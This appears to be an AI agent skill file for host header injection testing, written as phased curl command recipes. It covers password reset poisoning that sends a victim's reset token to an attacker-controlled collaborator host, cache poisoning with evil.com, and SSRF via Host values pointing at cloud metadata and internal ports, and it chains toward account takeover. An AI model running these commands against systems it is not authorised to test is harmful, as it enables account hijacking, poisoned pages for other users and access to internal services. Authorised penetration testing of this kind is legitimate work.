---
name: vuln-host-header
description: "Host header injection testing — password reset poisoning, cache poisoning via Host, SSRF via Host header, routing bypass, virtual host confusion, port-based bypass. Triggers: 'host header injection', 'host header attack', 'host header poisoning', 'password reset poisoning host', 'cache poisoning host header', 'x-forwarded-host', 'x-host injection'."
---

# Host Header Injection Testing

Manipulate Host header to poison password resets, poison caches, and bypass routing.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
COLLAB="BURP_COLLABORATOR_HOST"

# Basic Host header manipulation:
curl -s -H "Host: evil.com" "$TARGET/" | head -20

# X-Forwarded-Host bypass:
curl -s -H "Host: target.com" -H "X-Forwarded-Host: evil.com" "$TARGET/" | head -20

# Check if reflected in response:
curl -s -H "Host: CANARY.evil.com" "$TARGET/" | grep -i "CANARY"

# Password reset host poisoning — trigger reset and intercept:
curl -s -X POST "$TARGET/api/password-reset" \
  -H "Host: $COLLAB" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# X-Host header variants:
HEADERS=("X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" "Forwarded")
for H in "${HEADERS[@]}"; do
  RESP=$(curl -s -H "$H: evil.com" "$TARGET/password-reset" -X POST \
    -d 'email=test@test.com' 2>/dev/null | grep -i "evil.com")
  [ -n "$RESP" ] && echo "$H: REFLECTED"
done | tee output/host_header_detect.txt
```

---

## Phase 2: Password Reset Poisoning

```bash
TARGET="https://TARGET"
COLLAB="BURP_COLLABORATOR_HOST"

# Send reset request with poisoned Host header:
curl -s -X POST "$TARGET/api/password/reset" \
  -H "Host: $COLLAB" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# Variation — absolute URL in reset link:
curl -s -X POST "$TARGET/api/password/reset" \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: $COLLAB" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# Monitor collaborator for the reset token in URL path/param
```

---

## Phase 3: Cache Poisoning via Host

```bash
TARGET="https://TARGET"

# Poison cache with malicious X-Forwarded-Host:
curl -s -H "Host: target.com" \
  -H "X-Forwarded-Host: evil.com" \
  "$TARGET/" | grep "evil.com"

# If cached, next visitor gets response with evil.com references
# Test: visit $TARGET/ without poisoned header — if evil.com appears, cache is poisoned

# Unkeyed header test:
curl -s -H "X-Forwarded-Host: evil.com" "$TARGET/static/app.js"

# Vary header shows which headers affect caching:
curl -s -I "$TARGET/" | grep -i "vary:"
```

---

## Phase 4: SSRF via Host Header

```bash
TARGET="https://TARGET"

# Route to internal hosts via Host manipulation:
curl -s -H "Host: 169.254.169.254" "$TARGET/"
curl -s -H "Host: localhost" "$TARGET/"
curl -s -H "Host: 10.0.0.1" "$TARGET/"

# With port:
curl -s -H "Host: localhost:8080" "$TARGET/"
curl -s -H "Host: 127.0.0.1:9200" "$TARGET/"  # Elasticsearch
```

---

## Output

Save to `output/`:
- `host_header_detect.txt` — headers that cause reflection
- `host_header_poc.txt` — password reset URL with attacker domain

## Next Phase

→ `vuln-password-reset-poisoning` for full ATO chain
→ `vuln-cache-deception` for cache poisoning steps
